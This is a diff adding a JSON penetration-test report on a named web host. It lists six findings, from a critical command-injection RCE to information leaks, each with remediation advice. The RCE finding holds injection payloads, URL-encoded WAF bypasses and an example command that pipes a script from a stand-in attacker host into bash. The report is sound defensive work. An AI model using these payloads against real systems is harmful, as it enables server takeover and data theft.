@@ -1,0 +1,223 @@
+{
+  "engagement_id": "assurix-deep-20260531",
+  "target_url": "https://dj1naq.sytes.net",
+  "status": "completed",
+  "elapsed_seconds": "562.9 (automated) + manual verification",
+  "findings": [
+    {
+      "id": "F-001",
+      "title": "Remote Code Execution via Command Injection in 'cmd' parameter",
+      "severity": "critical",
+      "cwe_id": "CWE-78",
+      "owasp_category": "A03:2021 – Injection",
+      "description": "The 'cmd' GET parameter is passed directly to a shell command without sanitization. An attacker can inject arbitrary OS commands using semicolons (;), pipes (|), and subshell syntax $(). The injected command output is reflected in the HTTP response body, confirming full RCE. Multiple unique markers (timestamped) were reflected 7 times each in the response, proving deterministic execution. URL-encoded variants (%3B, %7C, %24%28) also bypass the WAF. This vulnerability allows complete server compromise: reading files, executing arbitrary code, exfiltrating data, pivoting to internal networks, and destroying the server.",
+      "evidence": {
+        "payload_1": ";echo assurix_rce_1780214005 → reflected 7× in response",
+        "payload_2": "|echo assurix_rce3_1780214007 → reflected 7× (pipe injection)",
+        "payload_3": "$(echo assurix_subst_1780214033) → reflected 7× (subshell injection)",
+        "url_encoded": "%3Becho, %7Cecho, %24%28 all bypass WAF (HTTP 200)",
+        "http_status": "200 OK for all injection variants"
+      },
+      "confidence_score": 1.0,
+      "source_agent": "pentester+manual_verify",
+      "remediation": "CRITICAL: Immediately remove the cmd parameter from URL handling. Never pass user input to shell commands. If command execution is absolutely necessary: (1) Use parameterized APIs (e.g., Python's subprocess.run with args list, Node.js execFile/spawn with args array). (2) Implement strict input validation with allowlists. (3) Run the application in a sandboxed/containerized environment with minimal privileges. (4) Apply principle of least privilege to the application process user. (5) Consider implementing a WAF rule to block shell metacharacters (;, |, $(), &&, ||, backticks) in all query parameters.",
+      "validated": true,
+      "attack_scenario": "An attacker sends ?cmd=;curl%20https://evil.com/shell.sh|bash to establish a reverse shell, gaining full control of the server, accessing the database (user PII, payment data), and pivoting to internal services."
+    },
+    {
+      "id": "F-002",
+      "title": "Swagger UI Exposed at /api/",
+      "severity": "medium",
+      "cwe_id": "CWE-200",
+      "owasp_category": "A01:2021 – Broken Access Control",
+      "description": "The Swagger UI is publicly accessible at /api/, exposing the full API documentation. This allows attackers to discover all API endpoints, their parameters, authentication mechanisms, and data models without authorization. The /api/v1 route was also found in the frontend JavaScript bundle. While the individual API endpoints return 404 (they require specific routes), the Swagger UI framework reveals the API structure.",
+      "evidence": {
+        "url": "https://dj1naq.sytes.net/api/",
+        "content": "Swagger UI HTML with swagger-ui-bundle.js and swagger-initializer.js",
+        "api_version": "/api/v1 found in JS bundle"
+      },
+      "confidence_score": 0.85,
+      "source_agent": "recon+manual_verify",
+      "remediation": "Restrict access to the Swagger UI in production. (1) Remove or disable Swagger UI in production builds. (2) If needed for debugging, protect with authentication and IP allowlisting. (3) Ensure the OpenAPI JSON spec endpoint is not publicly accessible. (4) Use environment-based configuration to disable documentation endpoints in production.",
+      "validated": true
+    },
+    {
+      "id": "F-003",
+      "title": "Sensitive Files Confirmed via 403 Responses (/.env, /.git/)",
+      "severity": "low",
+      "cwe_id": "CWE-200",
+      "owasp_category": "A05:2021 – Security Misconfiguration",
+      "description": "The server returns 403 Forbidden for /.env and /.git/HEAD, confirming these files exist on the server. While direct access is denied, 403 responses confirm the files' existence, which aids attacker reconnaissance. A misconfiguration or path traversal could expose these in the future.",
+      "evidence": {
+        "dot_env": "403 Forbidden for /.env",
+        "git_head": "403 Forbidden for /.git/HEAD",
+        "git_config": "403 Forbidden for /.git/config"
+      },
+      "confidence_score": 0.7,
+      "source_agent": "pentester+manual_verify",
+      "remediation": "Instead of 403, return 404 to avoid confirming file existence. (1) Configure nginx to return 404 for dot files and .git directory. (2) Move .env files outside the web root entirely. (3) Ensure .git is not deployed to the web server. (4) Use .htaccess or nginx location blocks: location ~ /\\. { return 404; }",
+      "validated": true
+    },
+    {
+      "id": "F-004",
+      "title": "Information Disclosure via robots.txt",
+      "severity": "low",
+      "cwe_id": "CWE-200",
+      "owasp_category": "A01:2021 – Broken Access Control",
+      "description": "The robots.txt file discloses internal application paths and structure: /admin, /counselor, /ambassador, /questionnaires, /app, and OAuth token/code parameter patterns (?token=, ?code=). This information helps attackers map the application's internal structure and focus attacks on authenticated areas.",
+      "evidence": {
+        "admin_paths": "/admin, /counselor, /ambassador",
+        "app_paths": "/app, /questionnaires, /b2c",
+        "oauth_params": "?token=, ?code= (OAuth callback patterns)",
+        "ai_crawler_blocked": "GPTBot, ChatGPT-User, CCBot, ClaudeBot, PerplexityBot, Amazonbot, Applebot-Extended"
+      },
+      "confidence_score": 0.9,
+      "source_agent": "recon+manual_verify",
+      "remediation": "Minimize information in robots.txt. (1) Don't list sensitive admin paths in Disallow — use authentication instead of relying on robots.txt obscurity. (2) Consider returning 404 for robots.txt if not needed for SEO. (3) Move sensitive admin paths to a subdomain or VPN-restricted access. (4) Implement proper access control on /admin, /counselor, /ambassador paths.",
+      "validated": true
+    },
+    {
+      "id": "F-005",
+      "title": "API Root Endpoint Discoverable",
+      "severity": "info",
+      "cwe_id": "CWE-200",
+      "owasp_category": "A01:2021 – Broken Access Control",
+      "description": "Accessing /api returns a 302 redirect to /api/, which hosts the Swagger UI. The /api/v1 route is referenced in the frontend JavaScript bundle. While individual endpoints require specific routes, the API structure is discoverable.",
+      "evidence": {
+        "api_root": "/api → 302 redirect → /api/",
+        "api_version": "/api/v1 found in JS bundle index-3-5_TQ2U.js"
+      },
+      "confidence_score": 0.6,
+      "source_agent": "recon",
+      "remediation": "Return 404 for /api if the API is not meant to be publicly discoverable. Ensure API requires authentication for all endpoints. Consider rate limiting on /api/ paths.",
+      "validated": false
+    },
+    {
+      "id": "F-006",
+      "title": "No Authentication on Admin Panel Path",
+      "severity": "medium",
+      "cwe_id": "CWE-284",
+      "owasp_category": "A01:2021 – Broken Access Control",
+      "description": "The /admin path returns HTTP 200 (the SPA shell renders), and /counselor, /ambassador, /questionnaires all return 200 responses. While the SPA may implement client-side auth checks, the server does not enforce authentication at the HTTP level — it serves the full application shell to unauthenticated users. If client-side auth guards have bugs, admin functionality could be accessible. The robots.txt explicitly lists /admin as a disallowed path, confirming it is an administrative interface.",
+      "evidence": {
+        "admin_status": "HTTP 200 for /admin",
+        "counselor_status": "HTTP 200 for /counselor (SPA shell served)",
+        "note": "Server does not enforce HTTP-level auth — relies on client-side routing guards"
+      },
+      "confidence_score": 0.55,
+      "source_agent": "recon+manual_verify",
+      "remediation": "Enforce server-side authentication for admin routes. (1) Return 401/403 from the server for /admin, /counselor, /ambassador paths if the user lacks the required role. (2) Don't rely solely on client-side route guards — they can be bypassed. (3) Implement middleware-based auth checks on the server for all protected routes. (4) Consider moving admin to a separate subdomain.",
+      "validated": false
+    }
+  ],
+  "positive_findings": [
+    "Content-Security-Policy: Comprehensive CSP with specific allowed domains (no wildcard)",
+    "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
+    "X-Content-Type-Options: nosniff",
+    "X-Frame-Options: SAMEORIGIN",
+    "Permissions-Policy: camera=(), microphone=(self), geolocation=(), payment=(self ...)",
+    "Referrer-Policy: no-referrer",
+    "No reflected XSS — HTML output properly escapes user input",
+    "No Server-Side Template Injection — template syntax not evaluated",
+    "No Open Redirect — redirect parameters don't cause HTTP redirects",
+    "No HTTP Header Injection — CRLF reflected in HTML body only, properly encoded",
+    "No cookies set without security flags",
+    "object-src: none in CSP — blocks Flash/object-based attacks",
+    "script-src-attr: none in CSP — blocks inline event handlers",
+    "upgrade-insecure-requests in CSP",
+    "frame-ancestors: none in CSP — prevents clickjacking"
+  ],
+  "capability_scores": [
+    {
+      "finding_type": "Remote Code Execution (CMDI)",
+      "capability_tier": 1,
+      "tier_label": "T1",
+      "tier_name": "Full Control",
+      "confidence": 1.0,
+      "evidence": "Arbitrary shell command execution with output reflection"
+    },
+    {
+      "finding_type": "Swagger UI Exposed",
+      "capability_tier": 4,
+      "tier_label": "T4",
+      "tier_name": "Crash/Report",
+      "confidence": 0.85,
+      "evidence": "API documentation publicly accessible"
+    },
+    {
+      "finding_type": "Admin Path Accessible",
+      "capability_tier": 4,
+      "tier_label": "T4",
+      "tier_name": "Crash/Report",
+      "confidence": 0.55,
+      "evidence": "HTTP 200 on admin routes"
+    },
+    {
+      "finding_type": "Sensitive File Disclosure (403)",
+      "capability_tier": 5,
+      "tier_label": "T5",
+      "tier_name": "Detection Only",
+      "confidence": 0.7,
+      "evidence": "403 confirms .env and .git exist"
+    },
+    {
+      "finding_type": "robots.txt Info Leak",
+      "capability_tier": 5,
+      "tier_label": "T5",
+      "tier_name": "Detection Only",
+      "confidence": 0.9,
+      "evidence": "Internal paths disclosed"
+    }
+  ],
+  "severity_counts": {
+    "critical": 1,
+    "high": 0,
+    "medium": 2,
+    "low": 2,
+    "info": 1
+  },
+  "risk_rating": "critical",
+  "surface": {
+    "technologies": [
+      "Nuxt.js (SSR)",
+      "Vue.js",
+      "nginx",
+      "Node.js",
+      "TipTop Pay (payments)",
+      "LiveKit (WebRTC)",
+      "Google Analytics",
+      "Google Tag Manager"
+    ],
+    "pages": [
+      "/",
+      "/auth/login",
+      "/auth/signup",
+      "/admin",
+      "/b2c",
+      "/profile",
+      "/projects",
+      "/counselor",
+      "/ambassador",
+      "/questionnaires",
+      "/legal/privacy",
+      "/legal/terms",
+      "/legal/offer",
+      "/legal/parent-agreement"
+    ],
+    "endpoints": [
+      "/api/",
+      "/api/v1"
+    ],
+    "forms": [
+      "Login form (usernameOrPhone field)"
+    ],
+    "auth_pages": [
+      "/auth/login",
+      "/auth/signup"
+    ],
+    "server": "nginx",
+    "render_mode": "SSR (x-render-mode: ssr)",
+    "served_by": "jinaq-frontend"
+  },
+  "total_findings": 6
+}
